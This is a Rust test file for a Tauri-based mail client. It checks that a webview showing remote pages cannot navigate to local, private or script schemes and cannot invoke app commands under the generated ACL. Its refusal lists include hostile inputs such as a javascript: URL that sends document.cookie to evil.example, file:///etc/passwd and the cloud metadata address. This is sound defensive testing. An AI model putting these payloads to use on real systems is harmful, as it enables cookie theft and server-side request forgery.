//! The page window, tested as a security boundary.
//!
//! `browser.rs` opens the only webview in Mach that runs script somebody else
//! wrote. Everything worth asserting about it is a *refusal*, so every test
//! here is one: the window cannot call a command, and it cannot go anywhere
//! that would make it the app.
//!
//! # Why the IPC test uses a mock runtime, and where the ACL comes from
//!
//! The claim "a page in that window cannot reach a Tauri command" is a claim
//! about `tauri::webview::Webview::on_message`, which is where an invoke is
//! accepted or rejected. Reading `capabilities/default.json` and observing that
//! it says `"main"` is evidence about a file; running an invoke through the
//! real gate and watching it be refused is evidence about the mechanism. Both
//! are here, because they fail in different ways — the file test catches a
//! capability being widened, and this one catches Tauri changing what an empty
//! grant means.
//!
//! The runtime is a mock; **the access control list is not**. `mock_context`
//! ships a `Resolved::default()`, which grants nothing and reports
//! `has_app_acl == false` — a model of the project as it was before
//! `permissions/mach.toml` existed, and no longer a model of anything.
//! [`real_authority`] replaces it with the ACL `tauri-build` actually generated
//! from this crate's `permissions/` and `capabilities/` directories: the same
//! two files the shipped binary is compiled against, resolved by the same
//! `Resolved::resolve`, read by the same `RuntimeAuthority`. Every refusal
//! below is therefore the refusal the real app performs.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use mach_lib::browser::{self, Fixture, Refusal};
use tauri::ipc::{Origin, RuntimeAuthority};
use tauri::test::{mock_builder, mock_context, noop_assets, INVOKE_KEY};
use tauri::utils::acl::capability::Capability;
use tauri::utils::acl::manifest::Manifest;
use tauri::utils::acl::resolved::Resolved;
use tauri::utils::platform::Target;
use tauri::webview::InvokeRequest;
use url::Url;

// ===========================================================================
// Where the window may go
// ===========================================================================

fn url(s: &str) -> Url {
    Url::parse(s).unwrap_or_else(|e| panic!("{s}: {e}"))
}

fn allowed(s: &str) -> bool {
    browser::may_navigate(&url(s), None).is_ok()
}

/// The allowlist, spelled out. A diff on this test is the review.
#[test]
fn only_https_to_somewhere_on_the_internet() {
    for good in [
        "https://example.com/unsubscribe?token=abc",
        "https://mail.example.co.uk/u/1/opt-out",
        "https://example.com:8443/x",
        // WebKit navigates to this on its own and it carries nothing.
        "about:blank",
    ] {
        assert!(allowed(good), "{good} should have been allowed");
    }
}

/// The four schemes that would make this window part of the application.
///
/// `is_local_url` in Tauri decides whether an invoke is checked against the ACL
/// at all, and it answers yes for the `tauri:` protocol, for anything relative
/// to the app URL, and for every custom scheme the app registered — `plugin:`
/// among them. A page that reached one of those origins would be treated as the
/// app's own frontend, and with no app ACL manifest in this project that means
/// every command in the handler. So the guard is an allowlist of one scheme
/// rather than a list of bad places.
#[test]
fn it_can_never_become_the_app() {
    for hostile in [
        "tauri://localhost/index.html",
        "plugin://quick-file/guest.html",
        "ipc://localhost/list_accounts",
        "asset://localhost/mach.sqlite3",
        "file:///Users/someone/Library/Application%20Support/com.mach.mail/mach.sqlite3",
        // The dev server the owner's window loads its frontend from.
        "http://localhost:1420/",
        // Windows/Android spelling of the same origin, and the IPC one.
        "https://tauri.localhost/",
        "https://ipc.localhost/",
        // A QA control port is loopback on an ephemeral port.
        "http://127.0.0.1:53119/qa",
        "https://127.0.0.1:53119/qa",
        "https://[::1]:53119/qa",
        // …and the rest of the machine's neighbourhood.
        "https://192.168.1.10/",
        "https://10.1.2.3/",
        "https://169.254.169.254/latest/meta-data/",
        "https://[fd00::1]/",
        // Tailscale / carrier-grade NAT.
        "https://100.100.1.1/",
    ] {
        assert!(!allowed(hostile), "{hostile} was allowed");
    }
}

/// `http` is refused rather than upgraded, for the same reason the
/// `List-Unsubscribe` parser refuses it: the request is an assertion that this
/// address is live and read, and a stranger picked the destination.
#[test]
fn plaintext_http_is_refused_and_not_upgraded() {
    assert_eq!(
        browser::may_navigate(&url("http://example.com/unsubscribe"), None),
        Err(Refusal::Scheme)
    );
}

/// Schemes that are only dangerous if something navigates to them. Nothing
/// here ever will.
#[test]
fn no_javascript_no_data_no_blob() {
    for hostile in [
        "javascript:fetch('https://evil.example/'+document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "blob:https://example.com/2f3a",
        "mailto:unsub@example.com",
        "tel:+15555550100",
        "vbscript:msgbox(1)",
    ] {
        assert!(!allowed(hostile), "{hostile} was allowed");
    }
}

/// Credentials aimed at whoever answers, and a header written to be a denial
/// of service. Both are refused by `unsub::target::accepts_url`, which is the
/// same function the redirect policy uses — this asserts the page window is on
/// it too, rather than having grown a second copy of the host rules.
#[test]
fn userinfo_and_absurd_length_are_refused() {
    assert!(!allowed("https://user:password@example.com/"));
    let long = format!("https://example.com/{}", "a".repeat(4096));
    assert_eq!(browser::may_navigate(&url(&long), None), Err(Refusal::TooLong));
}

/// The fixture escape hatch, which the production path never constructs.
///
/// It is one origin, it has to be loopback, and it does not widen the policy
/// for anything else — a window opened on a fixture still cannot follow a
/// redirect to `plugin://` or to another port.
#[test]
fn a_fixture_widens_the_policy_by_exactly_one_origin() {
    let fixture = Fixture::loopback(&url("http://127.0.0.1:8975/unsubscribe.html"))
        .expect("a loopback fixture");

    assert!(browser::may_navigate(&url("http://127.0.0.1:8975/next"), Some(&fixture)).is_ok());
    for still_refused in [
        "http://127.0.0.1:8976/",
        "http://192.168.1.4:8975/",
        "plugin://quick-file/guest.html",
        "http://localhost:1420/",
        "file:///etc/passwd",
    ] {
        assert!(
            browser::may_navigate(&url(still_refused), Some(&fixture)).is_err(),
            "{still_refused} was allowed by a fixture that does not cover it"
        );
    }
    // And it is never reachable from a message: the only caller that builds one
    // is the QA control port, which is not in a release binary at all.
    assert!(Fixture::loopback(&url("https://example.com/")).is_none());
}

/// The fixture hatch has exactly one caller, and that caller is not in a
/// shipped binary.
///
/// `Fixture` is a public type, so "only QA builds one" is a claim about call
/// sites rather than about visibility. `qa/` is declared under
/// `#[cfg(debug_assertions)]` in `lib.rs` — `tests/capabilities.rs` asserts
/// that separately — so a fixture cannot exist in a release build at all,
/// provided nothing else constructs one. This is that provision, checked the
/// only way it can be: by reading the source.
#[test]
fn nothing_outside_the_qa_port_constructs_a_fixture() {
    use std::path::{Path, PathBuf};

    fn walk(dir: &Path, out: &mut Vec<PathBuf>) {
        for entry in std::fs::read_dir(dir).expect("readable") {
            let path = entry.expect("an entry").path();
            if path.is_dir() {
                walk(&path, out);
            } else if path.extension().is_some_and(|e| e == "rs") {
                out.push(path);
            }
        }
    }

    let src = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("src");
    let mut files = Vec::new();
    walk(&src, &mut files);
    assert!(files.len() > 20, "the walk found almost nothing");

    for path in files {
        let text = std::fs::read_to_string(&path).expect("readable");
        for (n, line) in text.lines().enumerate() {
            if !line.contains("Fixture::loopback") {
                continue;
            }
            let relative = path.strip_prefix(&src).unwrap().to_string_lossy().to_string();
            let allowed = relative.starts_with("qa/") || relative == "browser.rs";
            assert!(
                allowed,
                "{relative}:{} constructs a browser fixture. Only the QA control \
                 port may, because only it is compiled out of a release build.",
                n + 1
            );
        }
    }
}

/// What the title bar says is the host, taken from the URL the engine is
/// actually going to — so a redirect chain that ends somewhere else says so.
#[test]
fn the_address_shown_is_the_host_in_punycode() {
    assert_eq!(browser::address_label(&url("https://example.com/a/b?c=d#e")), "example.com");
    assert_eq!(
        browser::address_label(&url("https://sub.example.co.uk:8443/")),
        "sub.example.co.uk:8443"
    );
    // A Cyrillic 'а' in what looks like apple.com. The title never renders the
    // lookalike glyphs.
    assert_eq!(browser::address_label(&url("https://аpple.com/")), "xn--pple-43d.com");
}

// ===========================================================================
// What the window may ask Rust for: nothing
// ===========================================================================

/// `src-tauri`, from the test binary.
fn src_tauri() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
}

/// The ACL `tauri-build` generated for this crate, deserialized.
///
/// `gen/schemas/` is written by the build script from `permissions/` and
/// `capabilities/` and is committed, so this reads the same bytes the compiled
/// binary embeds rather than a second description of them. Both files are
/// `include_str!`-shaped inputs to `generate_context!` in the real binary; here
/// they are read at runtime so the test can resolve them itself.
fn generated<T: serde::de::DeserializeOwned>(name: &str) -> T {
    let path: &Path = &src_tauri().join("gen").join("schemas").join(name);
    let text = std::fs::read_to_string(path)
        .unwrap_or_else(|e| panic!("{} is generated by build.rs: {e}", path.display()));
    serde_json::from_str(&text).unwrap_or_else(|e| panic!("{} is not the ACL: {e}", path.display()))
}

/// The real access control list, resolved exactly as the shipped binary
/// resolves it.
///
/// This is the whole point of the file. `mock_context` hands out a
/// `Resolved::default()` — nothing allowed, `has_app_acl` false — and against
/// that harness the page window is refused for a reason the real app does not
/// have. Swapping in the generated ACL makes every assertion below a statement
/// about Mach.
fn real_authority() -> RuntimeAuthority {
    let acl: BTreeMap<String, Manifest> = generated("acl-manifests.json");
    let capabilities: BTreeMap<String, Capability> = generated("capabilities.json");
    assert!(
        acl.contains_key(tauri::utils::acl::APP_ACL_KEY),
        "no app ACL manifest — `permissions/` is what generates it, and without \
         it Tauri skips the ACL for every local-origin invoke in every window"
    );
    let resolved = Resolved::resolve(&acl, capabilities, Target::current())
        .expect("the committed ACL resolves");
    assert!(resolved.has_app_acl, "Resolved disagrees with the manifest");
    tauri::runtime_authority!(acl, resolved)
}

/// A real command name, with a stand-in body.
///
/// The name matters and the body does not: the gate under test resolves on the
/// command *name*, the window label and the origin, never on what the handler
/// does. `list_accounts` is the first thing the frontend calls on launch, so a
/// window that cannot call it has no mailbox in it.
#[tauri::command]
fn list_accounts() -> &'static str {
    "every account he has"
}

fn app() -> tauri::App<tauri::test::MockRuntime> {
    let mut context = mock_context(noop_assets());
    *context.runtime_authority_mut() = real_authority();
    mock_builder()
        .invoke_handler(tauri::generate_handler![list_accounts])
        .build(context)
        .expect("a mock app")
}

fn invoke_from(
    webview: &tauri::WebviewWindow<tauri::test::MockRuntime>,
    origin: &str,
) -> Result<tauri::ipc::InvokeResponseBody, serde_json::Value> {
    tauri::test::get_ipc_response(
        webview,
        InvokeRequest {
            cmd: "list_accounts".into(),
            callback: tauri::ipc::CallbackFn(0),
            error: tauri::ipc::CallbackFn(1),
            url: origin.parse().expect("an origin"),
            body: tauri::ipc::InvokeBody::default(),
            headers: Default::default(),
            invoke_key: INVOKE_KEY.to_string(),
        },
    )
}

/// The negative, and the control beside it.
///
/// The control matters as much as the refusal. Every check here is "this did
/// not work", and a harness that cannot invoke anything at all would pass all
/// of them while proving nothing — the same reason
/// `plugins::runtime::ConformanceReport` refuses a verdict with no control.
///
/// Note what the page window is holding while this fails: Tauri injects
/// `window.__TAURI_INTERNALS__` into every webview it creates, as a
/// non-writable, non-configurable property defined before any script Mach
/// controls could run, and the request below carries a *valid* invoke key. The
/// call is well-formed and it still does not run. That is the boundary.
#[test]
fn a_remote_page_in_the_page_window_cannot_call_a_command() {
    let app = app();
    let main = tauri::WebviewWindowBuilder::new(&app, "main", Default::default())
        .build()
        .expect("the main window");
    let page = tauri::WebviewWindowBuilder::new(&app, browser::WINDOW_LABEL, Default::default())
        .build()
        .expect("the page window");

    // Control: the app's own frontend, at the app's own origin, gets an answer.
    let answer = invoke_from(&main, "tauri://localhost")
        .expect("the app's own window must still be able to invoke");
    assert_eq!(
        answer.deserialize::<String>().unwrap(),
        "every account he has",
        "the harness can reach a command, so a refusal below means something"
    );

    // The thing this whole module exists for.
    for sender_origin in [
        "https://newsletter.example/unsubscribe",
        "https://evil.example/",
        // A page that got itself onto a plausible-looking host is no different.
        "https://accounts.google.com.evil.example/",
    ] {
        let refused = invoke_from(&page, sender_origin);
        assert!(
            refused.is_err(),
            "{sender_origin} in the page window reached a command: {refused:?}"
        );
    }

    // And the main window does not launder it either: a remote origin is
    // refused wherever it turns up, which is what makes the navigation guard on
    // the *main* window's message frames the second lock rather than the only one.
    assert!(invoke_from(&main, "https://newsletter.example/").is_err());
}

/// The residual risk, closed — and the test that used to describe it.
///
/// This was `a_local_origin_would_be_enough_which_is_why_navigation_is_an_allowlist`,
/// and it asserted the opposite of what it asserts now. It was written to hold
/// one honest sentence in place: Tauri decides whether to consult the ACL by
/// asking whether the request's origin is *local*, and with no app-level ACL
/// manifest a local origin ran an app command with no capability involved, in
/// **any** window. The empty capability grant refused the page window only at a
/// remote origin. `browser::may_navigate` was the whole lock, and the old test
/// said so by proving the lock behind it was not shut.
///
/// `permissions/mach.toml` shut it. `has_app_acl` is true, the ACL is consulted
/// for every invoke regardless of origin, the lookup is keyed on the window
/// label, and no capability names this one — so the call resolves to nothing
/// and is rejected before a handler runs.
///
/// Both grounds are asserted here, separately, because either one alone would
/// still hold and the point is that neither is now carrying the window on its
/// own:
///
///  1. the ACL refuses the invoke even from `tauri://localhost`;
///  2. `may_navigate` refuses to let the window reach that origin at all.
#[test]
fn the_page_window_is_refused_on_both_grounds() {
    let app = app();
    let main = tauri::WebviewWindowBuilder::new(&app, "main", Default::default())
        .build()
        .expect("the main window");
    let page = tauri::WebviewWindowBuilder::new(&app, browser::WINDOW_LABEL, Default::default())
        .build()
        .expect("the page window");

    // Ground one. The origin below is the app's own — the most privileged
    // string a request can carry — and it is refused in this window anyway.
    // The control is the same invoke from the mailbox, which must still work.
    assert!(
        invoke_from(&main, "tauri://localhost").is_ok(),
        "the mailbox must still be able to invoke, or this test proves nothing"
    );
    for local in ["tauri://localhost", "http://tauri.localhost", "http://localhost:1420"] {
        assert!(
            invoke_from(&page, local).is_err(),
            "{local} in the page window reached a command through the ACL"
        );
    }

    // Ground two, unchanged and still the outer lock: the window cannot get to
    // any of those origins in the first place.
    for local in ["tauri://localhost/", "http://localhost:1420/", "https://tauri.localhost/"] {
        assert!(
            browser::may_navigate(&url(local), None).is_err(),
            "{local} is a local origin and must never be navigable"
        );
    }
}

/// The other half of the ACL change, and the one that could break the app.
///
/// Turning `has_app_acl` on makes the ACL authoritative for **every** command in
/// **every** window, which is a change to the whole application and not to the
/// page window. A command the frontend calls but `permissions/mach.toml` does
/// not name would now be refused in the mailbox, at launch, with no compile
/// error anywhere — the failure this asserts against.
///
/// It is checked through `RuntimeAuthority::resolve_access`, which is the
/// function `on_message` calls, over the real resolved ACL and over the real
/// handler list read out of `lib.rs`. Four cells per command: the mailbox at a
/// local origin says yes, and the other three say no.
#[test]
fn every_command_the_mailbox_calls_still_resolves_and_only_there() {
    let authority = real_authority();
    let commands = registered_commands();
    assert!(commands.len() > 50, "the handler list did not parse: {commands:?}");

    // Rebuilt per use rather than cloned: `Origin` is not `Clone`.
    let remote = || Origin::Remote {
        url: url("https://newsletter.example/unsubscribe"),
    };

    for command in &commands {
        assert!(
            authority
                .resolve_access(command, "main", "main", &Origin::Local)
                .is_some(),
            "{command} is registered in lib.rs but no permission names it — the \
             mailbox would get \"not allowed by ACL\" for it at runtime. Add it \
             to permissions/mach.toml."
        );
        // The page window, both ways it could ask.
        for origin in [Origin::Local, remote()] {
            assert!(
                authority
                    .resolve_access(
                        command,
                        browser::WINDOW_LABEL,
                        browser::WINDOW_LABEL,
                        &origin
                    )
                    .is_none(),
                "{command} resolved for the page window at a {origin} origin"
            );
        }
        // And the mailbox itself is not a laundry: a remote origin inside it —
        // a message frame that got itself navigated — resolves to nothing too.
        assert!(
            authority.resolve_access(command, "main", "main", &remote()).is_none(),
            "{command} resolved for a remote origin in the mailbox window"
        );
    }
}

/// The commands `lib.rs` hands to `generate_handler!`, read out of the source.
///
/// The list has to come from the handler rather than from a copy, because the
/// failure being guarded against is precisely the two drifting apart.
fn registered_commands() -> Vec<String> {
    let source = std::fs::read_to_string(src_tauri().join("src").join("lib.rs"))
        .expect("lib.rs is readable");
    let after = source
        .split_once("generate_handler![")
        .expect("lib.rs registers a handler")
        .1;
    let list = after.split_once("])").expect("the handler list is closed").0;
    list.lines()
        .map(|line| line.trim().trim_end_matches(',').trim())
        .filter(|line| !line.is_empty() && !line.starts_with("//"))
        .map(|line| line.rsplit("::").next().unwrap().to_string())
        .collect()
}
